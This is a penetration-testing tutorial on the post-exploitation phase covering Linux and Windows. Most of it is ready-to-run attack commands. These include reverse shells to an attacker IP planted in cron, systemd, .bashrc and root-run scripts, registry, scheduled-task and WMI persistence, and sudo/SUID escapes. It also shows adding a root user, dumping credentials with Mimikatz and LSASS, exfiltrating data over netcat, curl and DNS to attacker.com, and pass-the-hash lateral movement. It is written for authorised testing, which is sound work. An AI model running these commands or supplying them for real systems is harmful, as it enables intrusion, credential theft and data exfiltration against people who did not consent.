# Post-Exploitation Phase

## What Is Post-Exploitation?

You got a shell. Now what?

Post-exploitation is everything that happens after your initial "break-in." Think of it like this: Getting through the front door (exploitation) is just the beginning. Now you need to explore the house, find the valuables, figure out how to get to other rooms, and maybe find a spare key so you can come back later.

In penetration testing terms, post-exploitation includes:
- **Situational awareness** - Where am I? What can I access?
- **Privilege escalation** - Getting more powerful access (user → admin)
- **Credential harvesting** - Finding passwords and keys
- **Persistence** - Maintaining access if you get disconnected
- **Internal reconnaissance** - Mapping the internal network
- **Data collection** - Finding and documenting sensitive information
- **Lateral movement preparation** - Setting up to move to other systems

---

## Why Post-Exploitation Matters

Initial access is often limited. You might have:
- A low-privilege user account
- Access to one system only
- Limited visibility into the network
- Restricted access to sensitive data

Post-exploitation transforms limited access into meaningful impact. It's the difference between:

**Without post-exploitation:** "We got a shell as www-data on the web server."

**With post-exploitation:** "We escalated to root, extracted database credentials, found the domain admin's password in a script, and demonstrated access to the entire internal network."

The second finding gets fixed. The first might be dismissed.

---

## The Post-Exploitation Process

Here's the systematic approach to post-exploitation:

```
┌─────────────────────────────────────────────────────────────────┐
│                   POST-EXPLOITATION WORKFLOW                     │
└─────────────────────────────────────────────────────────────────┘

    ┌──────────────┐
    │  Stabilize   │  ← Upgrade shell, ensure reliable access
    │    Shell     │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │  Situational │  ← Who am I? Where am I? What's here?
    │  Awareness   │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │  Establish   │  ← Create backup access (if authorized)
    │  Persistence │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │  Privilege   │  ← Elevate to root/admin/SYSTEM
    │  Escalation  │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │  Credential  │  ← Harvest passwords, hashes, tokens
    │  Harvesting  │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Internal   │  ← Map network, find other targets
    │    Recon     │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │    Data      │  ← Find sensitive information
    │  Collection  │
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   Prepare    │  ← Set up for lateral movement
    │   to Pivot   │
    └──────────────┘
```

---

## Step 1: Stabilize Your Shell

Before doing anything else, make sure your access is reliable.

### Upgrade to a Full TTY

Raw shells are unstable. Upgrade immediately.

```bash
# Python (most common)
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Then stabilize further
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
reset
```

### Check Your Connection

```bash
# Can you reach your attacker machine?
ping -c 1 YOUR_IP

# What's your connection?
who
w
last -a | head
```

### Consider Your Stealth Level

Before proceeding, consider your Rules of Engagement:

| Mode | Behavior | When to Use |
|------|----------|-------------|
| **Non-Evasive** | Use any tools, don't worry about alerts | Standard pentest, vulnerability assessment |
| **Hybrid** | Mix quiet and loud techniques | Testing detection capabilities |
| **Evasive** | Avoid all detection, mimic real attackers | Red team engagement |

For evasive testing, you'll need to:
- Avoid writing to disk when possible
- Use built-in system tools ("living off the land")
- Encrypt communications
- Clear logs and artifacts

---

## Step 2: Situational Awareness

Before escalating or pivoting, understand where you are.

### Basic Questions to Answer

```
1. Who am I?
2. What system is this?
3. What's running on this system?
4. Where am I in the network?
5. What can I access from here?
6. What's valuable on this system?
7. Who else uses this system?
```

### Linux Situational Awareness

#### Identity and Permissions

```bash
# Who am I?
whoami
id
groups

# What can I run as sudo?
sudo -l

# What's in my home directory?
ls -la ~/
cat ~/.bash_history
```

#### System Information

```bash
# System details
hostname
uname -a
cat /etc/os-release
cat /etc/issue

# What's running?
ps aux
ps aux | grep root

# What's installed?
dpkg -l          # Debian/Ubuntu
rpm -qa          # RedHat/CentOS
```

#### Network Information

```bash
# Network interfaces
ip a
ifconfig

# Routing table
ip route
route -n

# Active connections
netstat -tuln
ss -tuln
netstat -anp

# ARP table (nearby hosts)
arp -a
ip neigh

# DNS configuration
cat /etc/resolv.conf

# Hosts file
cat /etc/hosts
```

#### Users and Access

```bash
# All users
cat /etc/passwd

# Users with shells
cat /etc/passwd | grep -v nologin | grep -v false

# Currently logged in
who
w

# Login history
last -a

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts
```

#### Interesting Files

```bash
# Configuration files
ls -la /etc/*.conf

# Web roots
ls -la /var/www/
ls -la /var/www/html/

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# SUID binaries (potential privesc)
find / -perm -4000 2>/dev/null
```

### Windows Situational Awareness

#### Identity and Permissions

```powershell
# Who am I?
whoami
whoami /all
whoami /priv
whoami /groups

# Current domain
echo %USERDOMAIN%
[System.Environment]::UserDomainName
```

#### System Information

```powershell
# System details
hostname
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Running processes
tasklist
tasklist /svc
Get-Process

# Installed software
wmic product get name,version
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
```

#### Network Information

```powershell
# Network configuration
ipconfig /all
Get-NetIPConfiguration

# Routing table
route print
Get-NetRoute

# Active connections
netstat -ano
Get-NetTCPConnection

# ARP table
arp -a
Get-NetNeighbor

# DNS cache
ipconfig /displaydns

# Shares
net share
```

#### Users and Access

```powershell
# Local users
net user
Get-LocalUser

# Domain users (if domain joined)
net user /domain

# Administrators
net localgroup Administrators

# Currently logged in
query user
qwinsta

# RDP sessions
query session
```

#### Interesting Files and Locations

```powershell
# User directories
dir C:\Users\

# Recent documents
dir %USERPROFILE%\Documents

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Saved credentials
cmdkey /list

# Unattend files (may contain passwords)
dir C:\Windows\Panther\unattend.xml
dir C:\unattend.xml
```

### Automated Enumeration Scripts

Manual enumeration is thorough but slow. Use automated scripts for comprehensive coverage.

#### LinPEAS (Linux)

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
# On attacker:
python3 -m http.server 8000

# On target:
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Save output
./linpeas.sh | tee linpeas_output.txt
```

#### WinPEAS (Windows)

```powershell
# Download and run
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# Or transfer executable
# On attacker:
python3 -m http.server 8000

# On target:
certutil -urlcache -f http://YOUR_IP:8000/winPEASany.exe winpeas.exe
.\winpeas.exe
```

#### Other Useful Scripts

| Script | Platform | Purpose |
|--------|----------|---------|
| **LinEnum** | Linux | Comprehensive enumeration |
| **linux-exploit-suggester** | Linux | Kernel exploit suggestions |
| **Seatbelt** | Windows | Security-focused enumeration |
| **PowerUp** | Windows | Privilege escalation checks |
| **SharpUp** | Windows | .NET version of PowerUp |
| **Watson** | Windows | Missing patch enumeration |

---

## Step 3: Establish Persistence

Persistence ensures you maintain access if:
- Your shell dies
- The system reboots
- Someone kills your process
- Network issues occur

> **Important:** Only establish persistence if authorized in the Rules of Engagement. Always document what you create and remove it during cleanup.

### Linux Persistence Techniques

#### SSH Key

Most reliable and stealthy.

```bash
# Generate key on attacker machine
ssh-keygen -t rsa -b 4096 -f backdoor_key

# Add public key to target
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Connect later
ssh -i backdoor_key user@target
```

#### Cron Job

```bash
# Edit crontab
crontab -e

# Add reverse shell every minute
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# Or every hour at :00
0 * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

#### Systemd Service (Root Required)

```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl enable backdoor.service
systemctl start backdoor.service
```

#### Bashrc/Profile

```bash
# Add to user's .bashrc
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 &' >> ~/.bashrc

# Triggers on user login
```

### Windows Persistence Techniques

#### Registry Run Key

```powershell
# Current user (no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\payload.exe"

# All users (admin needed)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\payload.exe"
```

#### Scheduled Task

```powershell
# Create scheduled task
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\payload.exe" /sc onlogon /ru System

# Or on boot
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\payload.exe" /sc onstart /ru System

# Every hour
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\payload.exe" /sc hourly
```

#### WMI Event Subscription (Stealthy)

```powershell
# Create WMI persistence (runs on startup)
$filterName = 'BotFilter82'
$consumerName = 'BotConsumer23'
$command = 'C:\path\to\payload.exe'

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $WMIEventFilter
    Consumer = $WMIEventConsumer
}
```

#### Startup Folder

```powershell
# Copy payload to startup
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Or for all users (admin)
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Meterpreter Persistence

```bash
# In Meterpreter session
meterpreter > run persistence -U -i 10 -p 4444 -r YOUR_IP
# -U = at user login
# -i = reconnect interval (seconds)
# -p = port
# -r = attacker IP

# Or use exploit/windows/local/persistence
use exploit/windows/local/persistence
set SESSION 1
set LHOST YOUR_IP
run
```

---

## Step 4: Privilege Escalation

The goal: Go from your current user to the highest privilege possible.

| Platform | Low Privilege | Goal |
|----------|---------------|------|
| Linux | www-data, user | root |
| Windows | User | Administrator, SYSTEM |
| Domain | Domain User | Domain Admin |

### Linux Privilege Escalation

#### Quick Wins Checklist

```bash
# 1. Check sudo permissions (often misconfigured)
sudo -l
# Look for NOPASSWD entries or dangerous binaries

# 2. Check SUID binaries
find / -perm -4000 2>/dev/null
# Look for unusual SUID binaries

# 3. Check writable sensitive files
ls -la /etc/passwd
ls -la /etc/shadow
# If writable, you can add a user

# 4. Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
# Look for scripts you can modify

# 5. Check for credentials
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
cat ~/.bash_history | grep -i pass
```

#### Sudo Abuse

```bash
# If sudo -l shows something like:
# (ALL) NOPASSWD: /usr/bin/vim

# Escape to shell from vim
sudo vim -c ':!/bin/bash'

# Common sudo escapes:
sudo find . -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import os; os.system("/bin/bash")'
sudo less /etc/passwd  # Then !bash
sudo nmap --interactive  # Then !sh (old versions)

# GTFOBins has all the techniques: https://gtfobins.github.io/
```

#### SUID Binary Abuse

```bash
# List SUID binaries
find / -perm -4000 2>/dev/null

# Check each against GTFOBins
# Example: If /usr/bin/find has SUID
/usr/bin/find . -exec /bin/bash -p \; -quit

# Example: If /usr/bin/vim has SUID
/usr/bin/vim -c ':!/bin/bash'
```

#### Writable /etc/passwd

```bash
# If /etc/passwd is writable, add a root user
# Generate password hash
openssl passwd -1 -salt xyz password123
# Output: $1$xyz$abcdefghijklmnop

# Add to /etc/passwd
echo 'backdoor:$1$xyz$abcdefghijklmnop:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su backdoor
# Password: password123
```

#### Kernel Exploits

```bash
# Check kernel version
uname -a
uname -r

# Search for exploits
searchsploit linux kernel $(uname -r | cut -d '-' -f 1)

# Use linux-exploit-suggester
./linux-exploit-suggester.sh

# Common kernel exploits:
# - Dirty COW (CVE-2016-5195) - Linux < 4.8.3
# - DirtyCred (CVE-2022-2588) - Recent
# - PwnKit (CVE-2021-4034) - Polkit, very common
```

#### Cron Job Abuse

```bash
# View system cron
cat /etc/crontab

# Example: Cron runs /opt/scripts/backup.sh as root
# If you can write to that file:
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Wait for cron to execute
```

#### Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: python3 has cap_setuid
# Escalate:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Windows Privilege Escalation

#### Quick Wins Checklist

```powershell
# 1. Check current privileges
whoami /priv
# Look for SeImpersonatePrivilege, SeAssignPrimaryToken

# 2. Check for stored credentials
cmdkey /list
# If credentials stored, use runas

# 3. Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# Look for paths with spaces

# 4. Check for writable services
# Use PowerUp or manual checks

# 5. Check AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1, you can install as SYSTEM
```

#### Token Impersonation (Potato Attacks)

If you have **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege**:

```powershell
# Check privileges
whoami /priv

# If SeImpersonatePrivilege is enabled (common for service accounts)
# Use one of the "Potato" exploits:

# PrintSpoofer (Windows 10/Server 2019)
.\PrintSpoofer.exe -i -c "cmd"

# GodPotato (Most versions)
.\GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (Older systems)
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# SweetPotato
.\SweetPotato.exe -p cmd.exe
```

#### Unquoted Service Path

```powershell
# Find vulnerable services
wmic service get name,pathname | findstr /i /v "c:\windows" | findstr /i "Program"

# Example vulnerable path:
# C:\Program Files\My App\service.exe
# Windows will try:
# 1. C:\Program.exe
# 2. C:\Program Files\My.exe
# 3. C:\Program Files\My App\service.exe

# If you can write to C:\Program Files\My.exe:
copy shell.exe "C:\Program Files\My.exe"
# Then restart service (or wait for reboot)
```

#### AlwaysInstallElevated

```powershell
# Check if enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o shell.msi

# Install (runs as SYSTEM)
msiexec /quiet /qn /i shell.msi
```

#### Stored Credentials

```powershell
# Check for saved credentials
cmdkey /list

# If credentials found, use runas
runas /savecred /user:DOMAIN\admin "cmd.exe /c whoami > C:\temp\out.txt"

# Or run a reverse shell
runas /savecred /user:admin "C:\path\to\shell.exe"
```

#### Service Misconfigurations

```powershell
# Use PowerUp to find vulnerable services
. .\PowerUp.ps1
Invoke-AllChecks

# Or manually check service permissions
# Using accesschk (SysInternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# If you can modify a service:
sc config VulnService binpath= "C:\path\to\shell.exe"
sc stop VulnService
sc start VulnService
```

### Automated Privilege Escalation

#### Linux

```bash
# LinPEAS (comprehensive)
./linpeas.sh

# Linux Smart Enumeration
./lse.sh -l 1

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# SUID3NUM
python3 suid3num.py
```

#### Windows

```powershell
# WinPEAS (comprehensive)
.\winpeas.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Watson (patch analysis)
.\Watson.exe

# BeRoot
.\beRoot.exe
```

---

## Step 5: Credential Harvesting

Credentials enable lateral movement and persistence. Hunt for them everywhere.

### Linux Credential Locations

```bash
# History files
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history

# SSH keys
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ed25519
ls -la /home/*/.ssh/

# Configuration files
grep -r "password" /var/www/ 2>/dev/null
grep -r "pass" /etc/*.conf 2>/dev/null
cat /var/www/html/config.php
cat /var/www/html/.env

# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# Scripts with hardcoded credentials
grep -r "password\|passwd\|pwd" /opt/ 2>/dev/null
grep -r "password\|passwd\|pwd" /home/ 2>/dev/null

# Shadow file (if readable)
cat /etc/shadow
# Crack with john or hashcat
```

### Windows Credential Locations

#### SAM Database

```powershell
# Extract SAM and SYSTEM (as admin)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Transfer to attacker machine
# Then crack with:
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

#### Mimikatz (Memory Credentials)

```powershell
# Run Mimikatz
mimikatz.exe

# Dump passwords from memory
privilege::debug
sekurlsa::logonpasswords

# Dump all credentials
lsadump::sam
lsadump::secrets
lsadump::cache

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### LSASS Dump (Alternative to Mimikatz)

```powershell
# Create LSASS dump (Task Manager: right-click lsass.exe > Create dump)
# Or with procdump
procdump.exe -ma lsass.exe lsass.dmp

# Or with comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Extract offline with Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

#### Other Windows Credential Sources

```powershell
# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Browser passwords
# Use tools like LaZagne
.\LaZagne.exe all

# Saved RDP credentials
cmdkey /list

# Unattend files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattended.xml
type C:\sysprep\sysprep.xml

# Group Policy Preferences (cpassword)
findstr /S /I cpassword \\domain\sysvol\*.xml

# IIS configuration
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config
```

### Meterpreter Credential Harvesting

```bash
meterpreter > hashdump
# Dumps local account hashes

meterpreter > load kiwi
meterpreter > creds_all
# Mimikatz equivalent

meterpreter > lsa_dump_sam
# SAM database dump

meterpreter > run post/windows/gather/credentials/credential_collector
# Collect various credentials
```

---

## Step 6: Internal Reconnaissance

Now scan the internal network for additional targets.

### Network Discovery

```bash
# Linux
# Find other hosts
arp -a
ip neigh

# Scan subnet (if nmap available)
nmap -sn 192.168.1.0/24

# Ping sweep without nmap
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is up"; done

# Port scan without nmap
for port in 21 22 23 25 80 443 445 3389; do
    (echo >/dev/tcp/192.168.1.1/$port) &>/dev/null && echo "$port open"
done
```

```powershell
# Windows
# Find other hosts
arp -a
Get-NetNeighbor

# Ping sweep
1..254 | ForEach-Object { Test-Connection -ComputerName "192.168.1.$_" -Count 1 -Quiet } | ForEach-Object { if($_) { echo "192.168.1.$_ up" } }

# Port scan
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
```

### Active Directory Reconnaissance

If you're on a domain-joined system:

```powershell
# Domain information
nltest /dclist:domain.local
echo %LOGONSERVER%
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# Domain users
net user /domain
Get-ADUser -Filter * -Properties *

# Domain groups
net group /domain
net group "Domain Admins" /domain
Get-ADGroup -Filter *

# Domain computers
Get-ADComputer -Filter * -Properties *

# Find where users are logged in
# Use BloodHound/SharpHound
.\SharpHound.exe -c all
```

### BloodHound (Active Directory)

BloodHound maps attack paths in Active Directory.

```powershell
# Collect data with SharpHound
.\SharpHound.exe -c all

# Or with PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Transfer .zip file to attacker
# Import into BloodHound GUI
# Analyze attack paths to Domain Admin
```

### Internal Service Discovery

```bash
# Find interesting services
nmap -sV -p 21,22,23,25,80,110,139,143,443,445,1433,3306,3389,5432,5985 192.168.1.1

# Look for:
# - More web servers (80, 443, 8080)
# - Databases (1433=MSSQL, 3306=MySQL, 5432=Postgres)
# - Remote access (22=SSH, 3389=RDP, 5985=WinRM)
# - File shares (139, 445=SMB)
# - Mail (25=SMTP, 110=POP3, 143=IMAP)
```

---

## Step 7: Data Collection

Find sensitive data to demonstrate impact.

### What to Look For

| Data Type | Examples | Impact |
|-----------|----------|--------|
| **Credentials** | Passwords, hashes, keys | Direct access |
| **PII** | SSN, credit cards, health records | Compliance violation |
| **Financial** | Bank info, financial reports | Business impact |
| **Intellectual Property** | Source code, designs | Competitive harm |
| **Internal Docs** | Policies, network diagrams | Security exposure |

### Searching for Sensitive Data

#### Linux

```bash
# Find files with keywords
find / -name "*password*" 2>/dev/null
find / -name "*secret*" 2>/dev/null
find / -name "*.key" 2>/dev/null
find / -name "id_rsa" 2>/dev/null

# Search file contents
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null
grep -r "api_key\|apikey" / 2>/dev/null

# Find recently modified files
find / -mtime -7 -type f 2>/dev/null

# Find large files (might be databases)
find / -size +100M -type f 2>/dev/null
```

#### Windows

```powershell
# Find files with keywords
dir /s *password*.txt
dir /s *secret*.*
dir /s *.key

# Search file contents
findstr /si password *.txt *.xml *.config *.ini
findstr /si password C:\Users\*\Documents\*

# PowerShell search
Get-ChildItem -Path C:\ -Include *password*,*secret* -Recurse -ErrorAction SilentlyContinue

# Find recently modified files
Get-ChildItem -Path C:\ -Recurse | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }
```

### Data Exfiltration (If Authorized)

> **Important:** Only exfiltrate data if explicitly authorized in the Rules of Engagement. Use fake/test data when possible.

```bash
# Simple methods
# SCP (SSH)
scp sensitive.txt attacker@YOUR_IP:/path/

# Netcat
# Attacker: nc -lvnp 4444 > received.txt
# Target: nc YOUR_IP 4444 < sensitive.txt

# Base64 over DNS (stealthy)
cat sensitive.txt | base64 | while read line; do nslookup $line.attacker.com; done

# HTTP POST
curl -X POST -d @sensitive.txt http://YOUR_IP:8000/upload

# SMB
copy sensitive.txt \\YOUR_IP\share\
```

---

## Step 8: Prepare for Lateral Movement

Set up for moving to other systems.

### Techniques for Lateral Movement

| Technique | Requirement | Command |
|-----------|-------------|---------|
| **PSExec** | Admin creds + SMB | `psexec.py domain/user:pass@target cmd.exe` |
| **WMI** | Admin creds | `wmiexec.py domain/user:pass@target` |
| **WinRM** | Admin creds + WinRM | `evil-winrm -i target -u user -p pass` |
| **RDP** | RDP access + creds | `xfreerdp /u:user /p:pass /v:target` |
| **SSH** | SSH access + creds | `ssh user@target` |
| **Pass-the-Hash** | NTLM hash | `psexec.py -hashes :HASH domain/user@target` |
| **Pass-the-Ticket** | Kerberos ticket | `export KRB5CCNAME=ticket.ccache` |

### Port Forwarding/Tunneling

To reach systems that aren't directly accessible:

```bash
# SSH Local Port Forward
# Access target:3389 through your localhost:13389
ssh -L 13389:TARGET_IP:3389 user@pivot_host

# SSH Dynamic SOCKS Proxy
ssh -D 9050 user@pivot_host
# Then use proxychains: proxychains nmap TARGET_IP

# Chisel (if no SSH)
# Attacker: chisel server -p 8000 --reverse
# Target: chisel client YOUR_IP:8000 R:socks

# Meterpreter
meterpreter > portfwd add -l 3389 -p 3389 -r TARGET_IP
meterpreter > run autoroute -s 192.168.1.0/24
```

---

## Documentation During Post-Exploitation

Document everything during post-exploitation.

### What to Record

```markdown
## Post-Exploitation: [Hostname]

### Access Details
- **Initial Access:** www-data via Apache RCE
- **Time:** 2024-01-15 15:30 UTC
- **Privilege Escalation:** Sudo vim → root

### System Information
- **Hostname:** web-server-01
- **OS:** Ubuntu 20.04.3 LTS
- **IP:** 192.168.1.15
- **Role:** Web server, database credentials

### Credentials Found
| Username | Password/Hash | Source | Scope |
|----------|---------------|--------|-------|
| dbadmin | SuperSecret123 | /var/www/config.php | MySQL |
| root | $6$abc...[hash] | /etc/shadow | Local |
| admin | P@ssw0rd! | ~/.bash_history | Unknown |

### Sensitive Data
- Database: customer_data (10,000 records)
- Config files: AWS keys in /var/www/.env
- SSH keys: Found for user 'backup'

### Persistence Established
- SSH key added to root authorized_keys
- Cron job at /etc/cron.d/backup (to remove during cleanup)

### Lateral Movement Paths
- MySQL server at 192.168.1.20 (creds found)
- SSH to 192.168.1.25 as 'backup' user
- SMB shares accessible with domain creds

### Screenshots
- screenshot_001.png: Proof of root access
- screenshot_002.png: Database access
- screenshot_003.png: Sensitive customer data (redacted)
```

---

## Common Mistakes to Avoid

| Mistake | Consequence | Prevention |
|---------|-------------|------------|
| Skipping situational awareness | Miss easy privilege escalation | Always enumerate first |
| Not stabilizing shell | Lose access during critical moments | Upgrade shell immediately |
| Forgetting persistence | Lose access, waste time re-exploiting | Establish early (if authorized) |
| Not documenting credentials | Can't use them later, missing from report | Record everything immediately |
| Loud reconnaissance | Detection and session killed | Consider stealth requirements |
| Skipping automated tools | Miss common privesc vectors | Use LinPEAS/WinPEAS |
| Not cleaning up | Artifacts remain post-engagement | Track what you create |
| Exfiltrating real data | Legal/ethical issues | Use fake data or hashes |

---

## Quick Reference: Post-Exploitation Checklist

### Immediate Actions
- [ ] Upgrade to stable shell
- [ ] Check who you are (`whoami`, `id`)
- [ ] Check system info (`uname -a`, `systeminfo`)
- [ ] Check network (`ip a`, `ipconfig`)

### Privilege Escalation
- [ ] Check sudo permissions (`sudo -l`)
- [ ] Check SUID binaries (`find / -perm -4000`)
- [ ] Check kernel version for exploits
- [ ] Run LinPEAS/WinPEAS
- [ ] Check for stored credentials

### Credential Harvesting
- [ ] History files
- [ ] Configuration files
- [ ] SSH keys
- [ ] Browser passwords
- [ ] SAM/LSASS (Windows)

### Persistence (If Authorized)
- [ ] SSH key added
- [ ] Scheduled task/cron job
- [ ] Document what you created

### Internal Recon
- [ ] Map internal network
- [ ] Identify domain controllers
- [ ] Find additional targets
- [ ] Run BloodHound (AD)

### Documentation
- [ ] Screenshot access proof
- [ ] Record all credentials
- [ ] Document sensitive data found
- [ ] Note lateral movement paths

---

## Summary

Post-exploitation transforms initial access into meaningful impact. Remember:

1. **Stabilize first** - Upgrade your shell before doing anything else
2. **Know where you are** - Situational awareness saves time
3. **Escalate privileges** - Low-privilege access limits what you can demonstrate
4. **Harvest credentials** - They're the keys to lateral movement
5. **Document everything** - Your report depends on good notes
6. **Think about stealth** - Consider your Rules of Engagement
7. **Prepare for movement** - Post-exploitation sets up lateral movement

The goal of post-exploitation isn't just to collect trophies—it's to demonstrate the real-world impact of the vulnerabilities you exploited and map paths to the client's most critical assets.
